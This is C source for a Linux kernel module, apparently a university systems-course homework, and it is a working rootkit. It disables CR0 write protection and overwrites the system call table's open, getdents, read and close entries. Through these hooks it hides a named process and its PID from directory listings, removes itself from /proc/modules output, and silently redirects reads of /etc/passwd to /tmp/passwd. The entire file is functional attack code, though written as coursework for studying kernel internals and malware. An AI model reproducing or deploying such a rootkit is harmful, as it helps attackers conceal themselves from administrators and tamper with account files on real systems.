/*****************************************
 *  --- ECE650 HW5 Connor Grehlinger --- * 
 *****************************************/
#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define BUFFLEN 256

// linux_dirent struct to ensure correct interpretation:
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

#define TARGET_PASSWD "/etc/passwd"
#define TEMP_PASSWD "/tmp/passwd"

static char * sneaky_pid = "0000000000000000";
// set module parameters
module_param(sneaky_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sneaky_pid, "sneaky_process pid");

static int file_desc_flag = -1;


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect to find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);



// added methods for other original calls (I think signatures have to match)
asmlinkage int (*getdents_o)(unsigned int fd, struct linux_dirent* dirp,
			     unsigned int count);

asmlinkage int (*read_o)(int fd, void * buf, size_t count);

asmlinkage int (*close_o)(int fd);


asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent* dirp,
			       unsigned int count){
  int numBytes = getdents_o(fd, dirp, count); // original call

  struct linux_dirent * dirent;
  int position = 0; // position (in bytes)

  while ((position < numBytes) && (position >= 0)){
    unsigned short record_byte_size;
    int target_found = 0; // flag
    // current dirent
    dirent = (struct linux_dirent *) ((char *)dirp + position); 
    record_byte_size = dirent->d_reclen;

    if (strcmp(dirent->d_name, "sneaky_process") == 0){
      // found process to hide
      printk(KERN_INFO "Found process to hide\n");
      target_found = 1;
    }
    else if(strcmp(dirent->d_name, sneaky_pid) == 0){
      // found pid dir to hide
      printk(KERN_INFO "Found pid to hide\n");
      target_found = 1;
    }

    if (target_found){
      // not totally sure about this
      memcpy(dirent, (char*)dirent + dirent->d_reclen,
	     numBytes - (size_t)(((char*)dirent + dirent->d_reclen)
				 - (char*)dirp));
      numBytes -= record_byte_size;
      break;
    }
    position += record_byte_size;
  }
  return numBytes;
}

asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, size_t count){
  ssize_t returnVal = read_o(fd, buf, count);

  // need to check if the fd is corresponding to any of:
  // proc/modules, /etc/passwd, etc
  
  if ((file_desc_flag == fd) && (file_desc_flag >= 0)){
    // if open has been called for something to hide:
    char * sneaky_mod_ptr = NULL;
    char * newline_ptr = NULL;

    sneaky_mod_ptr = strstr(buf,"sneaky_mod");
    if (sneaky_mod_ptr != NULL){
      newline_ptr = strchr(sneaky_mod_ptr, '\n');
      if (newline_ptr != NULL){

	memcpy(sneaky_mod_ptr, newline_ptr + 1,
	       returnVal - (ssize_t)((newline_ptr - (char*)buf)));
	returnVal -= (ssize_t)(newline_ptr - sneaky_mod_ptr);
      }
    }
  }
  
  return returnVal;
}


//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags){

  int returnVal;
  char buffer[sizeof(TARGET_PASSWD)];
  memset(buffer, 0, sizeof(buffer));

  
  if (strcmp(TARGET_PASSWD, pathname) == 0){
    printk(KERN_INFO "Open call to /etc/passwd \n");

    
    if (!copy_to_user((void*)pathname, TEMP_PASSWD, sizeof(TEMP_PASSWD))){
      printk(KERN_INFO "Successful substitution\n");
    }
    else{
      printk(KERN_INFO "Unsuccessful substitution\n");
    }
    // copied the /tmp/passwd to where /etc/passwd was passed in
    
    returnVal = original_call(pathname, flags);

    if (!copy_to_user((void*)pathname, TARGET_PASSWD, sizeof(TARGET_PASSWD))){
      printk(KERN_INFO "Successful re-substitution\n");
    }
    else{
      printk(KERN_INFO "Unsuccessful re-substitution\n");
    }
    
    return returnVal;
  }
  else{
    
    returnVal = original_call(pathname, flags);
    if (strcmp(pathname, "/proc/modules") == 0){
      printk(KERN_INFO "Sneaky open of /proc/modules\n");
      file_desc_flag = returnVal;
    }
    return returnVal;
  }
}


asmlinkage int sneaky_sys_close(int fd){
  if (fd == file_desc_flag){
    printk(KERN_INFO "Sneaky close\n");
    file_desc_flag = -1;
  }
  
  return close_o(fd);
}



//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void){
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  getdents_o = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  read_o = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  close_o = (void*)*(sys_call_table + __NR_close);
  *(sys_call_table + __NR_close) = (unsigned long)sneaky_sys_close;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  printk(KERN_INFO "Sneaky process pid %s \n", sneaky_pid);
  
  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)getdents_o;
  *(sys_call_table + __NR_close) = (unsigned long)close_o;
  *(sys_call_table + __NR_read) = (unsigned long)read_o;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

